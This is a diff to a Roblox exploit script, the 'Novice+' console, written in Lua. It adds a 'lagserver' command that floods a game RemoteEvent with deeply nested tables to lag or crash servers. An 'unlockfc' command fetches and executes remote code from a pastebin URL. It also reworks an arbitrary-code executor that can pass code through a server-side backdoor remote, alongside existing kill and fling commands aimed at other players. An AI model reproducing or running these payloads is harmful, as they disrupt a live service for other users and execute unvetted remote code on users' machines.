@@ -3667,49 +3667,8 @@ noviceModule = function()
 
 
 	end
-	lui.Executor= function()
-		local function executeCode(code)
-			if lui.isSS then 
-				if ssSettings.method == nil then
-					ssSettings.remote:FireServer(code)
-				else 
-					ssSettings.remote:FireServer(ssSettings.method,code)
-				end
-			else 
-				pcall(loadstring(code))
-			end
-		end
 
-		noviceOS.Run.MouseButton1Click:Connect(function()
-			notify3:Play()
-			executeCode(tbObject.TextBox.Text)
-		end)
-		noviceOS.Clear.MouseButton1Click:Connect(function()
 
-			notify2:Play()
-			tbObject.TextBox.Text = ""
-		end)
-		noviceOS.Copy.MouseButton1Click:Connect(function()
-
-			notify2:Play()
-			setclipboard(tbObject.TextBox.Text)
-		end)
-		noviceOS.ExecuteCopied.MouseButton1Click:Connect(function()	
-			errorSound:Play()
-			if isfolder("Novice") then
-				-- The folder already exists so we wont make another one
-			else
-				makefolder("Novice")
-				writefile("Novice/executeCopiedText.lua",[[--PLEASE PRESS CTRL+V AND CTRL+S ONCE DONE PRESS OK IN THE MESSAGEBOX]])
-				-- Make folder because it doesnt already exist
-			end
-			messagebox("Please open your Novice folder (should be in Workspace) within your exploit and open 'executeCopiedText.lua' DO NOT PRESS OK IF YOU HAVE NOT READ THE FILE","Novice+",0)
-			print("continue")
-			pcall(loadstring(readfile("Novice/executeCopiedText.lua")))
-		end)
-		fullscreenToggle(noviceOS.Executor)
-		lui.taskbarButton(noviceOS.Executor,false,noviceOS.OpenExecutor)
-	end
 	lui.RemoteFinder = function()
 		local remoteFinder = {}
 		remoteFinder.makeButton = function(source ,obj)
@@ -4224,7 +4183,24 @@ noviceModule = function()
 	lui.ConsoleCommands = {}
 	function lui.Console()
 		local console = {}
-
+		console.SyntaxColor = {
+			["%[Er%]"] = [[<font color="rgb(245,66,66)">replacementString</font>]],
+			["%[Pr%]"] = [[<font color="rgb(194, 194, 194)">replacementString</font>]],
+			["%[Wa%]"] = [[<font color="rgb(245, 224, 66)">replacementString</font>]],
+		}
+		console.Syntax = function(text)
+			local newString = ""..text
+			for i,v in pairs(console.SyntaxColor) do
+				local newStr = string.gsub(v,"replacementString",string.gsub(i,"%%",""))
+				local subString,times = string.gsub(newString,i,newStr)
+				print("REPALCED ",times,"GOT STIRNG", subString, " THE REPALCEMENT PATTER NWAS ".. i)
+				if times ~= 0 then
+					newString = subString
+					break
+				end
+			end
+			return newString
+		end
 		console.makeLines = function(input)
 			local function renderLine(text)
 
@@ -4244,6 +4220,7 @@ noviceModule = function()
 				consoleObj.obj.TextScaled = true
 				consoleObj.obj.TextSize = 14.000
 				consoleObj.obj.TextWrapped = true
+				consoleObj.obj.RichText = true
 				consoleObj.obj.TextXAlignment = Enum.TextXAlignment.Left
 
 				consoleObj.UIPadding_38.Parent = consoleObj.obj
@@ -4253,6 +4230,7 @@ noviceModule = function()
 				consoleObj.UITextSizeConstraint_8.MaxTextSize = 14
 				noviceOS.ScrollingFrame_3.CanvasPosition = Vector2.new(0,999999999)
 
+				consoleObj.obj.Text = console.Syntax(text)
 			end
 			if typeof(input) == "string" then
 				renderLine(input)
@@ -4290,7 +4268,14 @@ noviceModule = function()
 			if #argsTable == 1 then 
 				argsTable = argsTable[1]
 			end
-			pcall(callback,argsTable)
+			local succ,err = pcall(callback,argsTable)
+			print(succ,err)
+			if err then
+				console.makeLines({"[C:Er] "..tostring(err),
+					""
+				})
+			end
+
 			-- user pressed enter
 		end)
 		fullscreenToggle(noviceOS.Console_2)
@@ -4306,6 +4291,31 @@ noviceModule = function()
 
 	local console = lui.Console()
 	local savedThings = {}
+	local consoleAddons = {}
+	function consoleAddons.GetPlayer(name)
+		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+			if v.Name:lower():sub(1, #name) == name:lower() or v.	DisplayName:lower():sub(1, #name) == name:lower() then
+				return v
+			end
+		end    
+	end
+	function consoleAddons.getBoolean(stringBool)
+		local bool = false
+		if stringBool == "true" or stringBool == "on" then
+			bool = true
+		end
+		return bool
+	end
+	function consoleAddons.GetExtraArgs(args)
+		local extraArgs = string.split(args,",")
+		local hasExtra = false
+		if #extraArgs > 1 then
+			hasExtra = true
+		else 
+			extraArgs = nil
+		end
+		return extraArgs
+	end
 	lui.ConsoleCommands = {
 		["info"] = { --COMMAND
 			callback = function()
@@ -4340,8 +4350,128 @@ noviceModule = function()
 				console.makeLines("")
 			end	
 		},
+		["unlockfc"] = {
+			callback = function()
+				loadstring(game:HttpGet(("https://pastebin.com/raw/mfrMFUcJ"),true))()
+				console.makeLines({
+					"[Pr] Shift+P to toggle freecam",
+					""
+				})
+			end,
+		},
+		["lagserver"] = {
+			["status"] = {true,false},
+			callback = function(args)
+				local bool = consoleAddons.getBoolean(args)
+				--// fixed by ewo 6/17/2022
 
-		
+				--//settings + variables
+				getgenv().Toggled= bool
+				getgenv().Delay=0.7
+				local UIS=game:GetService'UserInputService'
+
+				--//main
+
+
+				coroutine.wrap(function()
+					local function Source()
+						game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+						local function getmaxvalue(val)
+							local mainvalueifonetable = 49999
+							if type(val) ~= "number" then
+								return nil
+							end
+							local calculateperfectval = (mainvalueifonetable/(val+2))
+							return calculateperfectval
+						end
+
+						local function bomb(tableincrease, tries)
+							local maintable = {}
+							local spammedtable = {}
+
+							table.insert(spammedtable, {})
+							z = spammedtable[1]
+
+							for i = 1, tableincrease do
+								local tableins = {}
+								table.insert(z, tableins)
+								z = tableins
+							end
+
+							local calculatemax = getmaxvalue(tableincrease)
+							local maximum
+
+							if calculatemax then
+								maximum = calculatemax
+							else
+								maximum = 10000
+							end
+
+							for i = 1, maximum do
+								table.insert(maintable, spammedtable)
+							end
+
+							if calculatemax then
+								maximum = calculatemax
+							else
+								maximum = 10000
+							end
+
+							for i = 1, maximum do
+								table.insert(maintable, spammedtable)
+							end
+
+							for i = 1, tries do
+								game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
+							end
+						end
+
+
+						bomb(250, 5) --// change values if client crashes
+					end
+
+					while getgenv().Toggled do
+						Source()
+						wait(getgenv().Delay)
+					end
+				end)()
+
+			end,
+		},
+		["orbit"] = {
+			["status"] = {true,false},
+			["target"] = {"string"},
+			callback = function(args)
+				local bool = consoleAddons.getBoolean(args[1])
+				local target = consoleAddons.GetPlayer(args[2])
+				if not bool then 
+					local player = target.Character.HumanoidRootPart --- enter players name there (do it)
+					local lpr = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+
+					local speed = 8 
+					local radius = 8 --- orbit size
+					local eclipse = 1 --- width of orbit
+					local rotation = CFrame.Angles(0,0,0) --only works for unanchored parts (not localplayer)
+
+
+					local sin, cos = math.sin, math.cos
+					local rotspeed = math.pi*2/speed
+					eclipse = eclipse * radius
+					local runservice = game:GetService('RunService')
+
+
+					local rot = 0
+					orbitRunService = game:GetService('RunService').Stepped:connect(function(t, dt)
+						rot = rot + dt * rotspeed
+						lpr.CFrame = rotation * CFrame.new(sin(rot)*eclipse, 0, cos(rot)*radius) + player.Position
+					end)
+				else 
+					orbitRunService:Disconnect()
+				end
+			end,
+		},
+
 		["kill"] = {
 			["Player(s)"] = {"string"},
 			callback = function(args)
@@ -4400,7 +4530,7 @@ noviceModule = function()
 						local chr = Human
 						local hrp = chr:WaitForChild("HumanoidRootPart")
 						local pos = Human:WaitForChild("HumanoidRootPart").Position
-						local maxTimes = 2000
+						local maxTimes = 2500
 						local localTimes = 0
 						repeat game["Run Service"].Heartbeat:Wait() localTimes = localTimes + 1
 							if plr.Character:FindFirstChild("HumanoidRootPart") then
@@ -4472,9 +4602,11 @@ noviceModule = function()
 								print("its on "..extraArgs[times.Value])
 								mainFling(extraArgs[times.Value])
 							else 
-								console.makeLines({
-									"[Pr] Done flinging",
-								})
+								if hasExtra then 
+									console.makeLines({
+										"[Pr] Done flinging",
+									})
+								end
 								times:Destroy()
 								return
 							end
@@ -4937,6 +5069,63 @@ noviceModule = function()
 		},
 
 	}
+	lui.Executor= function()
+		local function executeCode(code)
+			if lui.isSS then 
+				if ssSettings.method == nil then
+					ssSettings.remote:FireServer(code)
+				else 
+					ssSettings.remote:FireServer(ssSettings.method,code)
+				end
+			else 
+				local succ,err = pcall(loadstring(code))
+				print(succ,err)
+				if err then
+					console.makeLines({"[Er] "..tostring(err),
+						""
+					})
+				end
+
+			end
+		end
+
+		noviceOS.Run.MouseButton1Click:Connect(function()
+			notify3:Play()
+			executeCode(tbObject.TextBox.Text)
+		end)
+		noviceOS.Clear.MouseButton1Click:Connect(function()
+
+			notify2:Play()
+			tbObject.TextBox.Text = ""
+		end)
+		noviceOS.Copy.MouseButton1Click:Connect(function()
+
+			notify2:Play()
+			setclipboard(tbObject.TextBox.Text)
+		end)
+		noviceOS.ExecuteCopied.MouseButton1Click:Connect(function()	
+			errorSound:Play()
+			if isfolder("Novice") then
+				-- The folder already exists so we wont make another one
+			else
+				makefolder("Novice")
+				writefile("Novice/executeCopiedText.lua",[[--PLEASE PRESS CTRL+V AND CTRL+S ONCE DONE PRESS OK IN THE MESSAGEBOX]])
+				-- Make folder because it doesnt already exist
+			end
+			messagebox("Please open your Novice folder (should be in Workspace) within your exploit and open 'executeCopiedText.lua' DO NOT PRESS OK IF YOU HAVE NOT READ THE FILE","Novice+",0)
+			print("continue")
+			local succ,err = pcall(loadstring(readfile("Novice/executeCopiedText.lua")))
+			print(succ,err)
+			if err then
+				console.makeLines({"[Er] "..tostring(err),
+					""
+				})
+			end
+		end)
+		fullscreenToggle(noviceOS.Executor)
+		lui.taskbarButton(noviceOS.Executor,false,noviceOS.OpenExecutor)
+	end
+
 	local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
 	console.makeLines({
 		"Local Player",
@@ -5055,49 +5244,3 @@ end
 
 coroutine.wrap(Drag)()
 
-
-local function QDTVP_fake_script() -- noviceOS.OpenExecutor.LocalScript 
-	local script = Instance.new('LocalScript', noviceOS.OpenExecutor)
-
-
-	script.Parent.MouseButton1Click:Connect(function()
-		print("hi")
-	end)
-end
-coroutine.wrap(QDTVP_fake_script)()
-local function UDLVZ_fake_script() -- noviceOS.Run.LocalScript 
-	local script = Instance.new('LocalScript', noviceOS.Run)
-
-
-	script.Parent.MouseButton1Click:Connect(function()
-		print("hi")
-	end)
-end
-coroutine.wrap(UDLVZ_fake_script)()
-local function BPVEZ_fake_script() -- noviceOS.Clear.LocalScript 
-	local script = Instance.new('LocalScript', noviceOS.Clear)
-
-
-	script.Parent.MouseButton1Click:Connect(function()
-		print("hi")
-	end)
-end
-coroutine.wrap(BPVEZ_fake_script)()
-local function FGYZJLF_fake_script() -- noviceOS.Copy.LocalScript 
-	local script = Instance.new('LocalScript', noviceOS.Copy)
-
-
-	script.Parent.MouseButton1Click:Connect(function()
-		print("hi")
-	end)
-end
-coroutine.wrap(FGYZJLF_fake_script)()
-local function IKCTY_fake_script() -- noviceOS.ExecuteCopied.LocalScript 
-	local script = Instance.new('LocalScript', noviceOS.ExecuteCopied)
-
-
-	script.Parent.MouseButton1Click:Connect(function()
-		print("hi")
-	end)
-end
-coroutine.wrap(IKCTY_fake_script)()
